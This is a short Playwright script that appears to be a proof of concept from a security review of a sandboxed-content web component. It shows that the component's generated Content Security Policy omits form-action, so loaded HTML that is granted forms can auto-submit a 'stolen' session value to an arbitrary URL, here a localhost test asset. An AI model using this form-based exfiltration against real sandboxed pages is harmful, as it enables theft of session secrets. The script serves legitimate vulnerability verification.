import { chromium } from '/home/user/web-sandbox/node_modules/playwright/index.mjs';
const browser = await chromium.launch({ executablePath: '/opt/pw-browsers/chromium-1194/chrome-linux/chrome' });
const EXFIL = 'http://localhost:4444/playground/test-assets/local-image.svg';

// form-action is NOT in the default-src fallback chain, and generateCSP drops it as an empty array.
// A consumer who legitimately enables allow-forms therefore gets an unrestricted submission target.
const html = `<html><head><title>t</title></head><body>
  <form id="f" action="${EXFIL}" method="GET">
    <input name="stolen" value="session-secret">
  </form>
  <script>document.getElementById('f').submit();</script>
</body></html>`;

const page = await browser.newPage();
const hits = [];
page.on('request', r => { if (r.url().startsWith(EXFIL)) hits.push(r.url()); });
let violation = null;
page.on('console', m => { if (/Refused to/i.test(m.text())) violation = m.text().slice(0, 110); });

await page.goto('http://localhost:4444/playground/index.html');
await page.waitForSelector('lofi-sandbox');
await page.evaluate((h) => {
  const s = document.querySelector('lofi-sandbox');
  s.setConfig({ capabilities: ['allow-scripts', 'allow-forms'] });  // both are in ALLOWED_CAPABILITIES
  s.load(h);
}, html);
await page.waitForTimeout(3000);

console.log('form submissions that reached the network:', hits.length);
for (const h of hits) console.log('   ', h);
console.log('CSP violation logged:', violation ?? 'none');
await browser.close();
